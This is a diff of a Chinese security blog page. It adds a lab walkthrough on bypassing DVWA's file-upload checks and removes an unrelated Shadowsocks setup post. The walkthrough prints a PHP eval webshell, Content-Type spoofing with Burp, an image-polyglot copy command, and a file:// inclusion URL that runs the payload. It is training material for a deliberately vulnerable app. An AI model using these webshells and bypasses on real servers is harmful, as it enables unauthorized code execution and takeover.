@@ -252,6 +252,360 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/25/DVWAFileUpload/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Lawliet">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/L-Lawliet.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Lawliet Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/12/25/DVWAFileUpload/" itemprop="url">dvwa File Upload</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-25T17:59:14+08:00">
+                2017-12-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="dvwa文件上传"><a href="#dvwa文件上传" class="headerlink" title="dvwa文件上传"></a>dvwa文件上传</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><strong>文件上传漏洞是由于服务器对客户端上传的文件过滤不严导致恶意用户上传服务器可执行的web脚本语言，攻击者可以利用该漏洞获取网站的webshell，用菜刀连接进行提权等操作，攻击者可能利用此漏洞就能拿到服务器权限</strong></p>
+<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p><strong>一台win2003虚拟机，ip为192.168.50.128，用wamp集成环境将dvwa搭在8080端口</strong></p>
+<h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Upload&apos; ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );
+
+    // Can we move the file to the upload folder?
+    if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) {
+        // No
+        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
+    }
+    else {
+        // Yes!
+        echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
+    }
+}
+
+?&gt;
+</code></pre><p><strong>在此之前先来了解一下php的$_FILES变量以及与php文件上传有关的知识</strong></p>
+<pre><code>$_FILES数组内容如下:
+$_FILES[&apos;myFile&apos;][&apos;name&apos;] 客户端文件的原名称。
+$_FILES[&apos;myFile&apos;][&apos;type&apos;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&quot;image/gif&quot;。
+$_FILES[&apos;myFile&apos;][&apos;size&apos;] 已上传文件的大小，单位为字节。
+$_FILES[&apos;myFile&apos;][&apos;tmp_name&apos;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。
+$_FILES[&apos;myFile&apos;][&apos;error&apos;] 和该文件上传相关的错误代码。[&apos;error&apos;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量)
+UPLOAD_ERR_OK
+值：0; 没有错误发生，文件上传成功。
+UPLOAD_ERR_INI_SIZE
+值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。
+UPLOAD_ERR_FORM_SIZE
+值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。
+UPLOAD_ERR_PARTIAL
+值：3; 文件只有部分被上传。
+UPLOAD_ERR_NO_FILE
+值：4; 没有文件被上传。
+值：5; 上传文件大小为0.
+
+文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。
+</code></pre><p><strong>下面我们来看php代码，可以看到服务器在接收到了用户上传的文件后没有任何检查便直接将文件用<code>move_uploaded_file</code>函数移动到了dvwa目录下的hackable/uploads/目录下</strong></p>
+<p><strong>所以我们直接上传php一句话木马即可拿到网站webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/a3AahEGdcH.PNG" alt="mark"><br><strong>shell.php</strong></p>
+<pre><code>&lt;?php @eval($_POST[&apos;lawliet&apos;]);?&gt;
+</code></pre><p><strong>访问webshell地址，测试是否上传成功</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/chbKadDlC3.PNG" alt="mark"><br><strong>上传成功后得到webshell地址，用中国菜刀连接即可进行更进一步的渗透</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/Eb9JBClfCI.PNG" alt="mark"></p>
+<h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Upload&apos; ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );
+
+    // File information
+    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];
+    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];
+    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];
+
+    // Is it an image?
+    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;
+        ( $uploaded_size &lt; 100000 ) ) {
+
+        // Can we move the file to the upload folder?
+        if( !move_uploaded_file( $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ], $target_path ) ) {
+        // No
+        echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
+        }
+        else {
+            // Yes!
+            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
+        }
+    }
+    else {
+        // Invalid file
+        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;
+    }
+}
+
+?&gt;
+</code></pre><p><strong>可以看出服务器对<code>$_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ]</code>变量，也就是上传文件的MIME 类型进行了检查，同时也对文件大小做了限制，但是文件的MIME 类型检查我们是可以通过修改文件上传http数据包绕过的</strong></p>
+<p><strong>上传文件，burp抓包，发送至Repeater</strong></p>
+<p><strong>将数据包里的<code>Content-Type: application/octet-stream</code>改为服务器允许的类型<code>Content-Type: image/jpeg</code>，就能拿到网站的webshell</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/kJ74eiH9I7.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/1Fgf17Fdbl.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/aIFg6m7hFH.PNG" alt="mark"></p>
+<h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Upload&apos; ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;
+    $target_path .= basename( $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ] );
+
+    // File information
+    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);
+    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];
+    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];
+
+    // Is it an image?
+    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;
+        ( $uploaded_size &lt; 100000 ) &amp;&amp;
+        getimagesize( $uploaded_tmp ) ) {
+
+        // Can we move the file to the upload folder?
+        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {
+            // No
+            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
+        }
+        else {
+            // Yes!
+            echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;
+        }
+    }
+    else {
+        // Invalid file
+        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;
+}
+}
+
+?&gt;
+</code></pre><p><strong>可以看出服务器对文件后缀名进行了检查，并且用getimagesize函数检查文件是否为图片</strong></p>
+<p><strong>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</strong></p>
+<p><strong>在这里我们利用图片马绕过上传，并且利用dvwa的文件包含漏洞包含图片马，使服务器将图片马当做php解析运行</strong></p>
+<p><strong>图片马制作，进入cmd，输入以下命令</strong></p>
+<pre><code>copy heishacker.jpg/b+shell.php/b heishacker.jpg
+</code></pre><p><strong>heisheike.jpg:一张普通的图片，图片不能太大，否则会上传失败</strong><br><strong>shell.php:php一句话木马</strong></p>
+<p><strong><code>/b将文件以二进制格式连接</code></strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/e3kIBcmlfd.PNG" alt="mark"><br><strong>将图片马上传，上传成功，但是由于后缀名为jpg，所以被服务器当成了图片解析而不是php</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/c5dchjAidc.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/gjEe4ib82i.PNG" alt="mark"><br><strong>接下来利用文件包含漏洞包含图片马</strong></p>
+<p><strong>dvwa文件包含漏洞high级别代码</strong></p>
+<pre><code>&lt;?php
+
+// The page we wish to display
+$file = $_GET[ &apos;page&apos; ];
+if(!function_exists(&apos;fnmatch&apos;)) {
+
+    function fnmatch($pattern, $string) {
+        return preg_match(&quot;#^&quot;.strtr(preg_quote($pattern, &apos;#&apos;), array(&apos;\*&apos; =&gt; &apos;.*&apos;, &apos;\?&apos; =&gt; &apos;.&apos;)).&quot;$#i&quot;, $string);
+    } // end
+
+} // end if
+// Input validation
+if( !fnmatch( &quot;file*&quot;, $file ) &amp;&amp; $file != &quot;include.php&quot; ) {
+    // This isn&apos;t the page we want!
+    echo &quot;ERROR: File not found!&quot;;
+    exit;
+}
+
+?&gt;
+</code></pre><p><strong>可见文件包含出必须以file开头，我们用file协议读取图片马，payload</strong></p>
+<pre><code>`http://192.168.50.128:8080/DVWA-master/vulnerabilities/fi/?page=file:///C:/wamp/www/DVWA-master/hackable/uploads/heishacker.jpg`
+</code></pre><p><strong>可以发现利用文件包含使服务器将图片马当做php解析</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/4BBg82g8lA.PNG" alt="mark"><br><strong>可以用php的system函数执行cmd命令</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/171225/CEm97HHc02.PNG" alt="mark"></p>
+<h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p><strong>代码如下</strong></p>
+<pre><code>&lt;?php
+
+if( isset( $_POST[ &apos;Upload&apos; ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );
+
+
+    // File information
+    $uploaded_name = $_FILES[ &apos;uploaded&apos; ][ &apos;name&apos; ];
+    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &apos;.&apos; ) + 1);
+    $uploaded_size = $_FILES[ &apos;uploaded&apos; ][ &apos;size&apos; ];
+    $uploaded_type = $_FILES[ &apos;uploaded&apos; ][ &apos;type&apos; ];
+    $uploaded_tmp  = $_FILES[ &apos;uploaded&apos; ][ &apos;tmp_name&apos; ];
+
+    // Where are we going to be writing to?
+    $target_path   = DVWA_WEB_PAGE_TO_ROOT . &apos;hackable/uploads/&apos;;
+    //$target_file   = basename( $uploaded_name, &apos;.&apos; . $uploaded_ext ) . &apos;-&apos;;
+    $target_file   =  md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;
+    $temp_file     = ( ( ini_get( &apos;upload_tmp_dir&apos; ) == &apos;&apos; ) ? ( sys_get_temp_dir() ) : ( ini_get( &apos;upload_tmp_dir&apos; ) ) );
+    $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &apos;.&apos; . $uploaded_ext;
+
+    // Is it an image?
+    if( ( strtolower( $uploaded_ext ) == &apos;jpg&apos; || strtolower( $uploaded_ext ) == &apos;jpeg&apos; || strtolower( $uploaded_ext ) == &apos;png&apos; ) &amp;&amp;
+        ( $uploaded_size &lt; 100000 ) &amp;&amp;
+        ( $uploaded_type == &apos;image/jpeg&apos; || $uploaded_type == &apos;image/png&apos; ) &amp;&amp;
+        getimagesize( $uploaded_tmp ) ) {
+
+        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)
+        if( $uploaded_type == &apos;image/jpeg&apos; ) {
+            $img = imagecreatefromjpeg( $uploaded_tmp );
+            imagejpeg( $img, $temp_file, 100);
+        }
+        else {
+            $img = imagecreatefrompng( $uploaded_tmp );
+            imagepng( $img, $temp_file, 9);
+        }
+        imagedestroy( $img );
+
+        // Can we move the file to the web root from the temp folder?
+        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {
+            // Yes!
+            echo &quot;&lt;pre&gt;&lt;a href=&apos;${target_path}${target_file}&apos;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;
+        }
+        else {
+            // No
+            echo &apos;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&apos;;
+        }
+
+        // Delete any temp files
+        if( file_exists( $temp_file ) )
+            unlink( $temp_file );
+    }
+    else {
+        // Invalid file
+        echo &apos;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&apos;;
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre><p><strong>Impossible级别的代码对上传文件进行了重命名，加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</strong></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/12/24/sqlinjection/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2648,173 +3002,6 @@ ERROR 1105 (HY000): XPATH syntax error: &apos;root@localhost&apos;
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/08/shadowsocks/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Lawliet">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/L-Lawliet.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Lawliet Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/11/08/shadowsocks/" itemprop="url">科学上网,vultr vps主机上shadowsocks的搭建</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-08T16:51:26+08:00">
-                2017-11-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/科学上网/" itemprop="url" rel="index">
-                    <span itemprop="name">科学上网</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Vultr-vps主机上搭建shadowsocks"><a href="#Vultr-vps主机上搭建shadowsocks" class="headerlink" title="Vultr vps主机上搭建shadowsocks"></a>Vultr vps主机上搭建shadowsocks</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>一篇搭建shadowsocks科学上网的文章</strong></p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>我的理解：shadowsocks是基于ssh的,ssh基于RSA的加密技术,所以GFW无法获取传输的加密数据进行分析过滤,但由于创建隧道和数据传输的过程中，ssh本身的特征是明显的,导致GFW通过分析连接的特征进行干扰,而shadowsocks将ssh创建的 Socks5 协议拆开成 server 端和 client 端，那么我们就可以在本地的机器上进行ssh连接,从而解决被GFW通过特征分析进行干扰的问题</strong></p>
-<p><strong>感兴趣的小伙伴可以参考这篇文章:<a href="https://vc2tea.com/whats-shadowsocks/" title="写给非专业人士看的 Shadowsocks 简介" target="_blank" rel="external">写给非专业人士看的 Shadowsocks 简介</a>,写的很详细</strong></p>
-<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p><strong>一台vps主机,本人用的是Vultr,最低的每月2.5美元,<a href="https://www.vultr.com/?ref=7234691" title="点击此处" target="_blank" rel="external">点击此处</a>可以注册vultr<br>账号,网站支持支付宝,Paypal等支付,推荐Paypal,在国外支付十分方便,登陆vultr选节点和服务器,现在只有New York(NJ)的费用是最低的,速度也算良心,ping测试的速度在280ms左右,服务器推荐选centos7</strong></p>
-<p><strong>服务器远程连接工具,<a href="http://www.netsarang.com/products/xsh_overview.html" title="xshell下载地址" target="_blank" rel="external">xshell下载地址</a></strong></p>
-<h3 id="安装shadowsocks服务端"><a href="#安装shadowsocks服务端" class="headerlink" title="安装shadowsocks服务端"></a>安装shadowsocks服务端</h3><p><strong>用xshell以root权限登陆我们的vps,vps默认账号密码在我们的vultr账号中心的服务器列表中会有显示</strong></p>
-<p><strong>安装shadowsocks服务端,使用<a href="https://teddysun.com/342.html" title="teddysun" target="_blank" rel="external">teddysun</a>的一键安装脚本,简单的三条命令便可完成安装</strong></p>
-<pre><code>wget --no-check-certificate -O shadowsocks.sh https://raw.githubusercontent.com/teddysun/shadowsocks_install/master/shadowsocks.sh
-
-chmod +x shadowsocks.sh
-
-./shadowsocks.sh 2&gt;&amp;1 | tee shadowsocks.log
-</code></pre><p><strong>输入以上三条命令后,会让你输入一些东西去配置,如ssserver的登陆密码,端口,加密方法等,登陆密码默认为teddysun.com,输入你自己设置的密码,端口默认为8989,回车默认即可,不出意外的话就安装成功了</strong></p>
-<p><strong>启动:<code>/etc/init.d/shadowsocks start</code></strong></p>
-<p><strong>停止:<code>/etc/init.d/shadowsocks stop</code></strong></p>
-<p><strong>重启:<code>/etc/init.d/shadowsocks restart</code></strong></p>
-<p><strong>状态:<code>/etc/init.d/shadowsocks status</code></strong></p>
-<p><strong>卸载:<code>./shadowsocks.sh uninstall</code></strong></p>
-<p><strong>配置文件:我们如果想修改配置的话，可以打开配置文件<code>/etc/shadowsocks.json</code>进行配置</strong></p>
-<h3 id="安装shadowsocks服务端-1"><a href="#安装shadowsocks服务端-1" class="headerlink" title="安装shadowsocks服务端"></a>安装shadowsocks服务端</h3><p><strong><a href="https://github.com/shadowsocks/shadowsocks-windows/releases" title="windows版客户端" target="_blank" rel="external">windows版客户端</a></strong></p>
-<p><strong><a href="https://sourceforge.net/projects/shadowsocksgui/" title="mac版客户端" target="_blank" rel="external">mac版客户端</a></strong></p>
-<p><strong>安装完成后输入shadowsocks服务端的ip和默认端口(8989),输入我们设置的密码就完成了,接下来我们就可以科学上网去学习知识了</strong></p>
-<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><strong><a href="https://medium.com/@zoomyale/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%9A%84%E7%BB%88%E6%9E%81%E5%A7%BF%E5%8A%BF-%E5%9C%A8-vultr-vps-%E4%B8%8A%E6%90%AD%E5%BB%BA-shadowsocks-fd57c807d97e" title="科学上网的终极姿势-在-vultr-vps-上搭建-shadowsocks" target="_blank" rel="external">科学上网的终极姿势-在-vultr-vps-上搭建-shadowsocks</a></strong></p>
-<p><strong><a href="http://zhuangold.com/vultr-vps%E4%B8%BB%E6%9C%BA%E5%BF%AB%E9%80%9F%E5%AE%89%E8%A3%85shadowsocks%EF%BC%88ss%EF%BC%89%E6%95%99%E7%A8%8B/" title="vultr-vps主机快速安装shadowsocks（ss）教程" target="_blank" rel="external">vultr-vps主机快速安装shadowsocks（ss）教程</a></strong></p>
-<p><strong><a href="https://teddysun.com/342.html" title="Shadowsocks Python版一键安装脚本" target="_blank" rel="external">Shadowsocks Python版一键安装脚本</a></strong></p>
-<p><strong><a href="https://vc2tea.com/whats-shadowsocks/" title="写给非专业人士看的 Shadowsocks 简介" target="_blank" rel="external">写给非专业人士看的 Shadowsocks 简介</a></strong></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2869,7 +3056,7 @@ chmod +x shadowsocks.sh
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">23</span>
+                  <span class="site-state-item-count">24</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2880,7 +3067,7 @@ chmod +x shadowsocks.sh
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -2891,7 +3078,7 @@ chmod +x shadowsocks.sh
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
